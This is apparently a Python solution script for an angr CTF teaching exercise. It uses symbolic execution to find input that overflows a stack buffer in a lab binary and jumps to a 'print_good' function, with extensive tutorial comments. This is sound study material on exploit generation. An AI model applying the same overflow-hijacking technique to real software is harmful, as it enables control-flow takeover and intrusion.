# An unconstrained state occurs when there are too many
# possible branches from a single instruction. This occurs, among other ways,
# when the instruction pointer (on x86, eip) is completely symbolic, meaning
# that user input can control the address of code the computer executes.
# For example, imagine the following pseudo assembly:
#
# mov user_input, eax
# jmp eax
#
# The value of what the user entered dictates the next instruction. This
# is an unconstrained state. It wouldn't usually make sense for the execution
# engine to continue. (Where should the program jump to if eax could be
# anything?) Normally, when Angr encounters an unconstrained state, it throws
# it out. In our case, we want to exploit the unconstrained state to jump to
# a location of our choosing. We will get to how to disable Angr's default
# behavior later.
#
# This challenge represents a classic stack-based buffer overflow attack to
# overwrite the return address and jump to a function that prints "Good Job."
# Our strategy for solving the challenge is as follows:
# 1. Initialize the simulation and ask Angr to record unconstrained states.
# 2. Step through the simulation until we have found a state where eip is
#    symbolic.
# 3. Constrain eip to equal the address of the "print_good" function.

import angr
import claripy
import sys

def main(argv):
  path_to_binary =  "/home/angr/angr-dev/test/17_angr_arbitrary_jump"
  project = angr.Project(path_to_binary)

  # Make a symbolic input that has a decent size to trigger overflow
  # (!)

  class ReplacementScanf(angr.SimProcedure):
    # Hint: scanf("%u %20s")
    def run(self, format_string,  input_address):
      # %u
      symbolic_input = claripy.BVS("input", 64 * 8)
      
      # The bitvector.chop(bits=n) function splits the bitvector into a Python
      # list containing the bitvector in segments of n bits each. In this case,
      # we are splitting them into segments of 8 bits (one byte.)
      for char in symbolic_input.chop(bits=8):
        # Ensure that each character in the string is printable. An interesting
        # experiment, once you have a working solution, would be to run the code
        # without constraining the characters to the printable range of ASCII.
        # Even though the solution will technically work without this, it's more
        # difficult to enter in a solution that contains character you can't
        # copy, paste, or type into your terminal or the web form that checks 
        # your solution.
        # (!)
        self.state.add_constraints(char >= 'A', char <= 'z')

      # Warning: Endianness only applies to integers. If you store a string in
      # memory and treat it as a little-endian integer, it will be backwards.
      
      self.state.memory.store(input_address, symbolic_input)
      self.state.globals['solution'] = symbolic_input

  scanf_symbol = "__isoc99_scanf"  # :string
  project.hook_symbol(scanf_symbol, ReplacementScanf())
  # Create initial state and set stdin to the symbolic input
  initial_state = project.factory.entry_state(
        
          add_options = {
              angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
              angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS
              }
          )

  # The save_unconstrained=True parameter specifies to Angr to not throw out
  # unconstrained states. Instead, it will move them to the list called
  # 'simulation.unconstrained'.  Additionally, we will be using a few stashes
  # that are not included by default, such as 'found' and 'not_needed'. You will
  # see how these are used later.
  # (!)
  simulation = project.factory.simgr(
    initial_state,
    save_unconstrained=True,
    stashes={
      'active' : [initial_state],
      'unconstrained' : [],
      'found' : [],
      'not_needed' : []
    }
  )

  # Explore will not work for us, since the method specified with the 'find'
  # parameter will not be called on an unconstrained state. Instead, we want to
  # explore the binary ourselves. To get started, construct an exit condition
  # to know when the simulation has found a solution. We will later move
  # states from the unconstrained list to the simulation.found list.
  # Create a boolean value that indicates a state has been found.
  def has_found_solution():
    return simulation.found

  # An unconstrained state occurs when there are too many possible branches
  # from a single instruction. This occurs, among other ways, when the
  # instruction pointer (on x86, eip) is completely symbolic, meaning
  # that user input can control the address of code the computer executes.
  # For example, imagine the following pseudo assembly:
  #
  # mov user_input, eax
  # jmp eax
  #
  # The value of what the user entered dictates the next instruction. This
  # is an unconstrained state. It wouldn't usually make sense for the execution
  # engine to continue. (Where should the program jump to if eax could be
  # anything?) Normally, when Angr encounters an unconstrained state, it throws
  # it out. In our case, we want to exploit the unconstrained state to jump to
  # a location of our choosing.  Check if there are still unconstrained states
  # by examining the simulation.unconstrained list.
  # (!)
  def has_unconstrained_to_check():
    return len(simulation.unconstrained) > 0

  # The list simulation.active is a list of all states that can be explored
  # further.
  # (!)
  def has_active():
    return len(simulation.active) > 0

  while (has_active() or has_unconstrained_to_check()) and (not has_found_solution()):
    for unconstrained_state in simulation.unconstrained:
        # Look for unconstrained states and move them to the 'found' stash.
        # A 'stash' should be a string that corresponds to a list that stores
        # all the states that the state group keeps. Values include:
        #  'active' = states that can be stepped
        #  'deadended' = states that have exited the program
        #  'errored' = states that encountered an error with Angr
        #  'unconstrained' = states that are unconstrained
        #  'found' = solutions
        #  anything else = whatever you want, perhaps you want a 'not_needed',
        #                  you can call it whatever you want
        # (!)
      simulation.move('unconstrained', 'found')

    # Advance the simulation.
    simulation.step()

  if simulation.found:
    solution_state = simulation.found[0]

    # Constrain the instruction pointer to target the print_good function and
    # (!)
    solution_state.add_constraints(solution_state.regs.eip == 0x42585249)

    # Constrain the symbolic input to fall within printable range (capital
    # letters) for the web UI.  Ensure UTF-8 encoding.
    # (!)
    # for byte in symbolic_input.chop(bits=8):
    #   solution_state.add_constraints(
    #           byte >= ???,
    #           byte <= ???
    #   )

    # Solve for the symbolic_input
    # test =solution_state.state.globals['solution']
    # print(test)
    flag = solution_state.solver.eval(solution_state.globals["solution"], cast_to=bytes)
    print(flag)
  else:
    raise Exception('Could not find the solution')

if __name__ == '__main__':
  main(sys.argv)
